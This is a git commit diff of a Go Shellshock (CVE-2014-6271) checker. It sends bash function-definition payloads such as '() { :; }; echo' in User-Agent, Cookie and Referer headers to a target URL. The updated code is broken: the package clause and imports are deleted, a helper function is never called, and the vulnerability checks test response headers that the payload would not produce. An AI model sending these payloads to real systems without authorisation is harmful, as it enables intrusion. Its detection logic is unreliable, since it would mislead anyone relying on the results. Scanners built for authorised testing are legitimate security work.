c8c84f713df50c8e34364aa707b93c4a7f34d3e1
cbk914 <cbk914@riseup.net>
2023-01-14 04:42:41 +0100

    Update main.go

--- main.go
+++ main.go
@@ -1,36 +1,68 @@
 // Shellshock -CVE-2014–6271- Checker
 // Author: cbk914
-package main
-
-import (
-	"fmt"
-	"net/http"
-  "strings"
-  ""
-)
+func check_shellshock(url string) {
+    // Create the request
+    req, err := http.NewRequest("GET", url, nil)
+    if err != nil {
+        fmt.Println("Error creating request:", err)
+        os.Exit(1)
+    }
+    
+    // Add the headers with the shellshock payload
+    req.Header.Add("User-Agent", "() { :; }; echo \"Vulnerable\"")
+    req.Header.Add("Cookie", "() { :; }; echo \"Vulnerable\"")
+    req.Header.Add("Referer", "() { :; }; echo \"Vulnerable\"")
+    
+    // Send the request
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err != nil {
+        fmt.Println("Error sending request:", err)
+        os.Exit(1)
+    }
+    defer resp.Body.Close()
+    
+    // Check the response for the payload
+    if resp.StatusCode == 200 {
+        if resp.Header.Get("Vulnerable") == "Vulnerable" {
+            fmt.Println("Target is vulnerable to Shellshock.")
+        } else {
+            fmt.Println("Target is not vulnerable to Shellshock.")
+        }
+    } else {
+        fmt.Println("Error:", resp.Status)
+    }
+}
 
 func main() {
-	// Define the target URL as a command-line argument
-	url := flag.String("u", "", "Target URL")
+	// Define command line flag for target URL
+	targetUrl := flag.String("u", "", "Target URL")
 	flag.Parse()
 
-	// Construct the headers with the payload for the Shellshock vulnerability
-	headers := map[string][]string{
-		"User-Agent": {"() { :;}; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'"},
+	// Make sure a URL was provided
+	if *targetUrl == "" {
+		fmt.Println("Error: A target URL must be provided with the -u flag.")
+		os.Exit(1)
 	}
 
-	// Send the request to the target URL with the modified headers
-	resp, err := http.Get(*url, headers)
+	// Send the request
+	req, err := http.NewRequest("GET", *targetUrl, nil)
 	if err != nil {
 		fmt.Println(err)
-		return
+		os.Exit(1)
+	}
+	req.Header.Set("User-Agent", "() { :; }; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'")
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
 	}
 	defer resp.Body.Close()
 
-	// Check the response for the payload
-	if strings.Contains(resp.Status, "Vulnerable") {
-		fmt.Println("Target is vulnerable to Shellshock.")
+	// Check the response
+	if resp.StatusCode == 200 && (resp.Header.Get("X-CGI-Shellshock") != "" || resp.Header.Get("X-Shellshock") != "") {
+		fmt.Println("VULNERABLE: The target is vulnerable to Shellshock.")
 	} else {
-		fmt.Println("Target is not vulnerable to Shellshock.")
+		fmt.Println("SAFE: The target is not vulnerable to Shellshock.")
 	}
 }
